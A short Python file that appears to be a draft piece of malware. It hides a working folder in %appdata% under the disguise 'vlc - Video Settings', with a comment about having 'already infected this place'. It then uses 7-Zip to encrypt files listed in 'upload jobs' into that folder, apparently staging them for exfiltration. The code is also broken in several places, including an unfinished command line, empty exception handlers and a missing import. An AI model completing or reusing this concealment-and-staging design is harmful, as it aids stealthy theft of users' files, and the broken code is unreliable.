import os
import sys
import shlex
import subprocess
import concurrent.futures 

import baseUtils

class encryptor:

	outputDir = str()
	command_string = baseUtils.CommandString.encrypt_7z
	path_7z = baseUtils.get7zPath()	# but when will this thing be called, will it be called everytime, can it be shifted to __init__

	@classmethod
	def getOutputDir(self):
		return self.outputDir

	@classmethod
	def setOutputDir(self, dirPath):
		self.outputDir = dirPath
		return

	@classmethod
	def encryptFile(self, aJob):
		src_file_path, dest_file_path = aJob.src_path, aJob.dest_path
		outputName = os.path.join(self.outputDir, dest_file_path)
		command = command_string + 
		command = shlex.split(command)
		result = subprocess.run(command).returncode
		return




def createSafeDir():
	x = os.path.expandvars(r"%appdata%")
	os.chdir(x)
	try:
		os.mkdir("vlc - Video Settings", mode=0o777)
	except OSError:
		# i have already infected this place -- now matters are complicated
	except PermissionError:
		# ask user to re-run as admin
	os.chdir("./vlc - Video Settings")
	encryptor.setOutputDir(os.getcwd())
	return

def do(uploadJob):	# ----------------> main()
	encryptor.get7zPath()
	createSafeDir()
	with ProcessPoolExecutor(max_workers=4) as doer:	# cuz uploadJob is pickable BUTT 7zip and os are externals so maybe i should use threadPoolExecutor
		doer.map(encryptor.encryptFile, uploadJob)
	# for aJob in uploadJob:
	# 	encryptor.encryptFile(aJob.src_path, aJob.dest_path)
	return encryptor.getOutputDir()
